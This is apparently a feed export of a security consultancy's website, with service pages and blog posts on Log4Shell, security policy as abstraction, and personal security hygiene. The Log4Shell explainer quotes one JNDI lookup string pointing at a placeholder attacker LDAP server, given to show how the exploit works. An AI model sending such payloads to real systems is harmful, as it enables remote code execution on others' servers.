item.title: Home
item.content:encoded:
Abstracted Solutions

Security Through Abstraction

Stay ahead of emerging threats.

Malware is getting more and more advanced, malicious actors are targeting every element in an environment, and supply chains are being exploited. We are here to help you prepare for attacks, build in security within our products rather than making it an after thought.

 

Total Malware Infections (in millions)

We want to help.

Whether it’s a security consultation or assisting with your development processes, we want to help. Our ultimate goal is to help you develop the confidence and knowledge to secure and maintain your environment, manage your products and processes, and be better prepared for todays threats.

Learn more

item.title: About Me
item.content:encoded: It’s nice to meet you.

item.title: Services
item.content:encoded:
Knowledge is power.

Let’s not overcomplicate things.

 

We live in a world of complex systems and complexity will always be at odds with security. Many times, companies leverage buzz words and complicated proposals to add value to their services. We believe in abstracting away many of the complexities so you can focus on what's important. Let us simplify the process down to make it more manageable, secure, and scalable. Our goal is to leave more informed about your systems, and how to protect them so you can continue to make the right decisions.

At Abstracted Solutions, we approach our projects holistically. We want to consider complex systems as complex systems and not a collection of independent elements. Attackers will be looking at your environment as a whole, so we will to.

Our services.

  • Security Assessments

    Let us assess your digital and physical posture with an adversarial mindset. Whether it’s a penetration test, white box application assessment, review of your physical security, or red team engagement, we can put together a personalized proposal to help push your overall security posture.

  • Compliance and Policy

    We thrive on documentation and ensuring you are staying compliant with all relevant standards and regulations. Whether you need help developing policies and procedures or determining which standards are relevant to your company, we can help. This can help establish a more mature approach to security and business processes.

  • Business Services

    From patent research and intellectual property development to business development and project management, we can help get your project started or assist in taking it to the next level. We look forward to sharing our experience across both startups and large international companies into your current, or future, business.

  • Other

    Let us know what you need. We have experience in a multitude of fields from web development and graphic design to marketing and content development. Contact us for more information on how we can help you in your endeavors.

Trainings and Events.

Awareness and education are core tenets with all that we offer. Our goal is to leave our clients better than we found them and promote a deeper understanding of the technology we interact with. With that in mind, we try to do this a little differently than you might be use to… Through unique events and trainings, we can help grow your knowledge base and drive a deeper level of thinking around whatever you are working on.

Learn more

Let’s talk.

We want to work with you in order to provide the best, most impactful services possible.

Contact Us

item.title: About Us
item.content:encoded:
Our credentials.

We have a range of certifications from the CISSP (Certified Information Systems Security Professional) and OSCP (Offensive Security Certified Professional) to the AWS Solutions Architect Professional. We have specialized in IT management and Information Security while maintaining our knowledge in various types of technologies (e.g., cloud infrastructure, marketing platforms and processes, networking, and various software development stacks).

item.title: Log4Shell: The Basics
item.content:encoded:
The Log4j vulnerability has taken the world by storm and everyone is talking about it. Everyone from company executives to developers have been exposed to it and are all pushed to address it from their respective positions. With all the buzz came a slew articles and publications outlining the vulnerability, root cause, and mitigations but some leave out some important messages. The following aims to address a few things often overlooked in many of the technical reports of the vulnerability: high-level overview of the issue, some mitigations being implemented, and how to get ahead of the next major vulnerability. Let’s start with why Log4j exists.

An Intro to Logging

When there is an event (e.g., user logs into an application, certain actions are triggered, a user visits a page within a website), an error (e.g., an application throws an exception, invalid input is sent, errors accessing other services), or other conditions within a program are met, information can be logged to aid in debugging or provide an audit trail (e.g., user X logged in at 9:00:00). This can be a text file, log aggregation tools, or the console/screen and can play a huge part in any application. In fact, logging and data collection within applications can even be required when maintaining compliance with regulations associated with PCI, HIPAA, GDPR, or SOX. To simplify this process, libraries have been created to help making logging easier—Winston, Pino, Boost, Glog, Logr, Log4net, and of course, Log4j were all created to simplify the logging process. Each library attempts to give developers an easier way to log information and push the entries to other tools. As logging became more important, the libraries added more features such as the ability to send alerts on critical issues, filter out data that shouldn’t be saved to file, pull system information, and provide more data to correlate various events.

Log4Shell Overview

So we started with basic logging and now we have the Log4Shell vulnerability. How? Well, as systems became more complex and engineers needed more insight into what was happening within their applications, logging libraries added new features. Log4j added features such as Date Lookups to provide more information on when the log event was added, Environment Lookups to pull information from the local environment variables, Java Lookups to provide more information on the current Java runtime, and Jndi Lookups to retrieve variables via JNDI (Java Naming and Directory Interface). These lookups would allow a developer to log something like “$${env:USER}” which would then resolve to something like “Bob” when actually logged to file. In the case of the JNDI lookup, applications could lookup data via name and would pull information from a file, database, or server. The latter case is where things get interesting. This feature allowed information passed to the logger to trigger a lookup using an external service that might be controlled by another party. In the Log4Shell vulnerability, attackers are able to submit a lookup string (i.e., ${jndi:ldap://attackers_ip:1389/a}), which is interpreted by the Log4j library and causes the application to reach out to the specified LDAP server to pull the requested information. Since the LDAP server specified in the lookup string could be controlled by an attacker, they can direct the lookup to return malicious Java code that is executed within the target application/host. With various user-controlled information passed to the server, and subsequently logged, attackers can send applications a malicious JNDI lookup string to trigger remote code execution. Examples of the user-controlled data include submitted usernames, user-agent strings, or even Referer IP strings. This ultimately provides attackers an opportunity to take over systems, or launch other attacks.

Blast Radius

How could such a small feature cause so many issues? Java boasts statistics such as “3 billion devices run Java” or “6 million developers use Java.” Regardless of how accurate those statistics are, the bottom line is that Java is used everywhere and Log4j is one of the more popular logging frameworks. This simple vulnerability affects everything from banking applications and web servers to firewalls and security appliances. If your application doesn’t use Java, there’s a chance that the service hosting it, the firewall protecting it, or the dependencies it relies on do. The question of, “does Log4j exist in our environment” is surprisingly more complicated than expected and is causing many to scramble. Because this vulnerability is trivial exploit, many attackers have automated the process in attempts to exploit any publicly available service vulnerable to Log4Shell. This could include data exfiltration, or even installing crypto-mining applications on your servers.

Mitigations

So how are people patching their systems? Well the main recommendation is to update Log4j to a non-vulnerable version (2.17.0 at the time of writing this) or disable lookups within your Java environment. But as more vulnerabilities are found and different ways to leverage Log4j for evil are released, what more can you do? Starting at the basics, developers or organizations need to know what exists in their environment. This includes what packages are used, what versions exist, what services are relied on, and how applications are hosted. This allows teams to patch, and mitigate more quickly when zero-days are released. Next, environments should be organized in a more secure way. This means that in the case of a zero-day exploit, one compromise shouldn’t equate to a complete compromise of an environment. Make sure networks are segmented, firewalls are properly configured, zero-trust principals are used, and applications are run with proper, and restricted permissions. Also, ensure there is adequate logging (not vulnerable to Log4Shell) in place to investigate potential breaches or indications of compromise. While these steps won’t necessarily stop zero-day attacks, it will allow the team to be more agile in response and can limit the damage if one of your assets is compromised.

It’s important to note that some of these mitigations have their limitations. For example, WAFs (web application firewalls) typically won’t stop something it hasn’t seen before as they work off known attacks and signatures. But, in the case of Log4Shell, signatures were released quickly and those using a WAF to protect public endpoints quickly gained some protection against initial waves of attacks.

Staying Ahead

So you have patched your applications, and are comfortable with your environment, for now. What’s next? Looking back over the previous section, what’s stopping another zero-day in your environment from ruining next year’s holiday season? Do you have an inventory of what’s in your environment? Do you have security appliances monitoring your systems or network traffic? Is your network wide open or is it segmented to limit what an attacker might have access to? Do you know the reporting requirements if you did uncover a breach or would you even know you had a compromise? Do you have a process of patching and updating applications? These are just some of the questions that can help you prepare for the next “Log4j” and keep your environment more secure.

Questions

If you have any questions or concerns about Log4j in your environment, or are concerned about future attacks, feel free to contact us.
item.excerpt:encoded: The Log4j vulnerability has taken the world by storm and everyone is talking about it. Everyone from company executives to developers have been exposed to it and are all pushed to address it from their respective positions.
item.dc:creator: chris@abstracted.tech

item.title: Security Through Abstraction
item.content:encoded:
Abstraction is a fundamental concept in software development. At a high-level, abstraction revolves around the concept of dealing with ideas rather than events or details. This ultimately means is that specific details of a feature or implementation are hidden away in order to provide higher-level interfaces to make software easier to build on, maintain, and use.

To provide a real-wold example, consider a car. Many people are familiar with how to drive a car, and what you need to do to use it to leverage it in your daily life. But, do you need to know how it works at the engine or transmission level? If a fuel pump, air filter, or flux capacitor is swapped out, should you care as long as the car works and can get you from point A to point B? In the vast majority of situations, the answer is no. So, if a software developer swaps out the implementation of a database connector or specific algorithm for sorting data, should another developer leveraging that feature care? Again, in most cases—considering the feature works as well as it did in the past—the answer is no. These basic examples of abstraction or hiding away “useless” information from others can simplify the use of that product or feature and make it easier to maintain across a team.

So what about security? Many organizations leave out security until an incident and this can lead to “bolt-on security” and is typically very hard—or impossible—to do effectively. So where does abstraction come in within your security program? Many mature organizations do this by considering security in early stages of product development and by leveraging policies, processes, standards, and procedures. To simplify this further, this represents the why (policies), what (standards and guidelines), and how (procedures). Let’s digest this a bit more and add some more context.

Policy

A policy is a high-level statement or concept that executives and management will focus on. This could be something such as, “Internal systems will be implemented in a way to prevent unauthorized access.” This states a goal but avoids implementation details, what technology is associated with it, or any intricacies of the internal systems. These details are abstracted away so that the business can continue without needing to focus on potentially unnecessary or complicated information.

Standards and Guidelines

Standards can tell us how to implement and carry out policies. This can dictate details of an implementation that helps us comply with policies. These may be related to password complexity, authentication mechanisms, and information needed to satisfy the associated policy. When a standard doesn’t apply or an edge-case is encountered, guidelines can be used to help provide direction as to how to handle the situation. This is important since it’s unrealistic to assume that all situations will be covered through the defined standards.

Procedures

As we get lower on the list of concepts, we get more details as to how to carry something out. Where policies represent ideas and high-level concepts, procedures are step-by-step process to accomplish something. In the scope of our above example around unauthorized access to internal systems, procedures can be created to define what is shown to the user, what happens when someone tries to access a site without proper authorization, and what happens when something unexpected occurs. In the scope of abstraction, this is the bottom the ladder and the most technical step.

Building in Security

Now that we have established policies, procedures, and standards, we have to develop with these in mind. This helps us consider security in the early stages of development rather than post launch or in the later stages. With the foundation established, the tone is set for what is expected in our development lifecycle and this is very important. Back to the example around internal systems preventing unauthorized access, we now have to consider this policy and the associated standards when defining requirements within the development process rather than it being an afterthought.

In closing…

The concepts around policies, standards, and procedures represent a certain level of abstraction that can make an organization function more efficiently. This not only helps “hide” details from executives and management while providing engineers or developers a framework or direction for implementation, but can help make your products and features more modular and interchangeable to promote more agility when facing today’s emerging threats. These are simple steps that an organization can take to better progress the internal security posture, and ultimately reduce your attack vector. With the foundation established, organizations can consider moving forward with aggregated solutions, automation of various processes, and continue to develop with security—and efficiency—in mind.

Learn More
item.dc:creator: chris@abstracted.tech

item.title: Protect Yourself
item.content:encoded:
The most common question we get is, “How do I protect myself? Is it even possible?” Maintaining good ‘cybersecurity hygiene’ isn’t just possible, it’s pretty easy. But, before we get into the basics, let’s review one of the most important factors in security: risk. This is vital to consider because it directly impacts the steps we should take to secure an environment (e.g., your data, house, family, business, etc.). Security will always be at odds with convenience and it’s important to know your risks before trying to protect yourself or your process will fall apart and you’ll end up back at square one. Consider who would want to target you, what you have to offer to entice malicious actors, and what you have to lose. We will go over some of the basic steps you can take to protect yourself but remember, the more risks you face, the more you should do. Leveraging the following recommendations will help protect you from the majority of threats faced by most of the population—remember, you typically won’t be targeted directly but will be apart of a larger attempt to ‘shotgun’ the population and play the numbers game.

Anyway, let’s start with the basics!

Password Managers

The majority of data breaches include passwords or password ‘hashes’ (a value that represents the password without disclosing the actual password). This means that if you use the same password for everything, one data breach can put all your accounts at risk. Password managers help reduce this risk by making it easy to use UNIQUE passwords for each of your accounts. In addition to storing your passwords, password managers will help you choose random and difficult passwords to guess. This reduces the bias many of us have to use passwords that represent us as individuals (e.g., your childhood dog plus your birthday and a special character). Another great feature of many password managers is they will validate that the website you are entering your password on is the legitimate website and not one controlled by an attacker (more on this later).

Using these managers can be simple. Once installed on your computer or phone, the application will recommend passwords when creating accounts. Once the initial account creation has been completed, the password manager will save it, and allow you to access it when you visit the page again. People question if password managers provide a single point of failure allowing a hacker to steal all your passwords instead of just one. This is typically avoided by requiring multiple passwords on installation, security questions, and other authentication processes. This makes it extremely difficult to compromise your password manager and is significantly more secure than the notebook or sticky note next to your computer.

There are many password managers out there like 1Password, LastPass, or built-in managers like those found in Chrome or mobile phones. Using the iPhone / iCloud password manager can be a great start but may lead to issues if you have other non-Apple devices. Managers like 1Password cost a few dollars a month but can absolutely be worth it as an option to store passwords, and other important documents and information. These managers also include features such as two factor authentication and alerts if your information has been leaked in a data breach.

Two Factor Authentication (2FA)

2FA or MFA (multi-factor authentication) are two great ways of protecting your accounts and many services are starting to recommend or require it to maintain your account. These provide a second layer of defense to your account and can protect you if your password is guessed or leaked. This means that if you give someone your password (unintentionally), they still need your device to login and take over your account.

2FA typically comes in two flavors: single use codes sent to your cellphone or through a 2FA application. The security industry has recommended that if you can avoid 2FA via SMS (text messages), you should. One easy way to handle this is to use the built-in 2FA generator in 1Password. There are alternatives and many sites will recommend specific ones or a built-in 2FA in their mobile applications—like Gmail or Adobe Creative Cloud.

2FA may not be convenient if you share an account with others—since they won’t have access to your personal device—or if you don’t always have access to your device. For this reason, you can start with unique passwords managed through your password manager of choice and avoid easily guessable passwords—no one should ever use ‘password123’—and work on adding 2FA to any account you can. But, most of the account takeovers and ‘hacks’ that we have recently seen could have been easily avoided with 2FA.

Be Careful What You Click

Today, almost everyone has heard of phishing. This is the process of sending an actionable message to someone in hopes they click the link and disclose some sort of information (e.g., password, personal information, banking information, or your session token for a specific site). Attackers are getting better and better at making these messages more believable and many are falling for them. One of the main risks in any organization is social engineering. People will continue to be the weakest (or one of the weakest) links in any system. So how do you avoid these traps? Make sure you know what you are clicking. Take an extra second to look at the email or the text message before clicking and disclosing your bank account number or entering your password. There are a variety of things to watch for:

  • Bad grammar

  • Impersonal greetings (e.g., Dear sir/ma’am)

  • Odd or misspelled urls (e.g., FacebookSecurityTeaam.com or thebankkofamerica.com)

  • Your password manager is not auto-filling your username/password

Attackers won’t—usually—be able to use the main company’s URL (e.g., Facebook.com) and will have to find other ways of hosting the malicious site. Be cognizant of what URLs are associated with the action items and when in doubt, go to the legitimate website directly and look for alerts rather than responding to those in the email.

It’s also important to re-emphasize one of the above points: password manager auto-filling your credentials. When you visit a login page, many password managers will automatically input your username and password into the correct fields. This makes it easy to quickly log in to your account and get on your way. During this process, many password managers will validate that the website you signed in to is the intended and legitimate site. Each username/password stored in the manager will be associated with a domain (or website), and if you go to a website that does not match, the password manager will not automatically input your credentials and potentially give you a warning. This can act as a second set of eyes when navigating the internet.

In terms of attachments and various types of documents sent via email, don’t open what you don’t know or expect. Take a second and confirm with the sender of the PDF. Many types of documents can house malicious code and viruses so be careful what you open.

The Other Stuff

There are plenty of things you can do to better protect yourself (e.g., using a VPN, reducing information stored in cloud storage, using antivirus software, home network security, armed guards, attack dogs, small community militia, etc.). But, this comes back down to what/who your risks are. VPNs (virtual private networks) are very popular and many recommend them. They protect your traffic from your device to the destination—almost. This can be helpful if you use public networks like those found at many coffee shops or airports. But most of the time, they only make it more difficult for your internet service provider and social media to track you. You will also see people advocating full-disk encryption on laptops, various authentication concerns with mobile devices, and the information you disclose on social media. These all can help progress your cybersecurity posture but can be difficult to maintain if you aren’t on top of it.

In Closing

Security is a marathon, not a sprint. Find what works for you and keep doing it. Ultimately, your password manager will be useless if you go back to using the same password, or if you drop your guard next time you get a text informing you that there’s a million dollars waiting for as long as you log in to your bank account.

If you have any questions, feel free to reach out to us and ask how you can better protect yourself. Jumping into the security world can be intimidating and we are here to help. We look forward to working with you to increase awareness and better prepare you for emerging threats.

Send Us Your Questions
item.dc:creator: chris@abstracted.tech

item.title: The Unknown Space
item.content:encoded:
The Unknown Space.

“The best way to explain it is to do it.”

FAQs

Who?

Anyone looking to apply information. Whether it’s developers looking to push your product to the next level, cybersecurity information to increase awareness and make your organization more prepared for various threats, or new hires trying to digest organizational documents, we can help.

Why?

Many certifications and learning paths focus on providing information, and validating through tests. In many cases, simple memorization is enough to get through a class or pass a certification test. The real question becomes whether or not that individual can apply that information to real world problems. We want to validate the learning process with critical thinking and the application of information to solve problems, not memorization.

What?

We want to provide custom experiences for you and your organization. Depending on your goals and the target market, we create various types of puzzles and challenges to accelerate learning and information retention. The goal is to maximize understanding and retention through the application of information and what better way to do that than a good ole challenge.

When?

We can work with you to provide solutions for various types of events, onboarding new employees to your organization, the interview process to apply a more creative approach to validating potential, and everything in between. We want to make sure we target the right audience at the right time.

How?

We can provide you a complete solution or work with you to get your team involved. This on it’s own can help onboard teammates and force the understanding of various types of information. To craft a challenge, you must understand the information being used and predict how other’s will approach the issue. This can lead to a better understanding of not only the core information but the way its used within the organization.

Let’s talk.

Contact Us

404

“Not all those who wander are lost.”

item.title: Trainings and Events
item.content:encoded:
The fun stuff.

Some examples.

  • Sometimes you need to just go and touch something cool! I know what you are thinking… and no, it’s not that kind of “petting zoo.” Working with DC702 (a non-profit dedicated to hacking and awareness), we put on a security workshop and hosted a capture-the-flag event called “The Petting Zoo.” This got people out of their comfort zones and fostered creativity through solving challenges and working together. This touched various topics including web application attacks, binary exploitation, forensics, cryptography, lock picking, and much more. By exposing people to new topics in a fun and unique environment, everyone had fun and accidentally learned a thing or two.

    This can be tailored to whatever topics are most relevant to you and your organization (e.g., networking, blockchain, open source intelligence gathering, secure coding, your employee handbook, etc.).

  • Internal corporate briefings or presentations can bring new perspectives to a topic that you know well. We have worked with physical access control companies to drive a new perspective on something they were very familiar with—access control systems. By introducing an “adversarial” mindset and reviewing real world attacks and vulnerabilities, people can continue on with a new understanding on how certain people “interact” with their products. Sometimes all you need is an outsider to drive change and a mindset shift.

  • To put recent vulnerabilities in context for technical (as well as non-technical) people, a presentation around Log4j was put together including a live demonstration to show what all the buzz was about. By briefing the organization on what it was, how it came to be a vulnerability, why it was so dangerous, and how it was exploited, people could appreciate the work they were doing to remediate the issue and could put a metaphorical “face” to the name.

    As new vulnerabilities are released daily, this can be a great way to keep people up-to-date with cybersecurity topics and help keep security at the forefront of their mindsets.

  • We love locks. Lock picking may seem like an odd topic to teach people but it serves a couple interesting purposes. First, lock picking and the theory of why it’s possible provides a great parallel to cybersecurity. Next, it introduces an adversarial mindset to help approach development from an attacker’s perspective, not entirely from an engineer’s perspective. By taking this accessible topic and bringing it to those who are interested in the driving principals of cybersecurity and hacking.

    This presentation and “activity” has taken many forms and included meetups, corporate environments, and smaller team building events.

Let’s plan something.

Reach out and let’s figure out how to engage your people, and have a bit of fun. Whether it’s team building, security awareness training, or introducing your team to a new set of skills or mindset, we can help.

Contact Us
